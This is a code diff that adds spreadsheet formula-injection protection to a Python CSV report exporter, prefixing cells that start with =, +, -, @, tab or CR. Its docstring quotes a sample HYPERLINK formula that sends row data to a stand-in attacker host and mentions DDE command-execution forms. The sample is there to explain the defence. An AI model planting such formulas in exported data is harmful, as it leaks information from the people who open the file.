@@ -439,11 +439,39 @@ def _latin(s: str) -> str:
     return s.encode("latin-1", "ignore").decode("latin-1")
 
 
+# Leading characters that make Excel / LibreOffice / Google Sheets treat a cell
+# as a FORMULA rather than text. `-` and `+` are here because `-1+1` and
+# `+cmd|…` are both evaluated; the tab and CR forms are the variants that slip
+# past naive `startswith("=")` filters.
+_RISKY = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _defuse(v):
+    """Neutralize spreadsheet formula injection (CWE-1236) in exported cells.
+
+    Free-text columns in these reports are written by the LOWEST-privileged
+    role — `consumption."Remarks"` comes straight from a store keeper's entry
+    form — and are then opened in Excel by an HOD or admin. Without this, a
+    remark of `=HYPERLINK("https://attacker/?"&A1,"Open")` exfiltrates the row
+    on one click, and the DDE forms reach command execution. Prefixing with an
+    apostrophe is the standard neutralization: Excel strips it on display and
+    stores the value as text, so the report still reads correctly.
+
+    ONLY `str` values are touched. Quantities, valuations and unit costs arrive
+    here as int/float/Decimal and MUST pass through untouched — prefixing a
+    number would turn every accounting column into text and break the exports
+    this function exists to protect. See `xlsx_style.xl_val` for the twin.
+    """
+    if isinstance(v, str) and v[:1] in _RISKY:
+        return "'" + v
+    return v
+
+
 def to_csv(title, columns, rows, username) -> bytes:
     buf = io.StringIO()
     w = csv.writer(buf)
     w.writerow(columns)
-    w.writerows(rows)
+    w.writerows([_defuse(c) for c in r] for r in rows)
     return buf.getvalue().encode("utf-8-sig")  # BOM so Excel opens UTF-8 cleanly
 
 
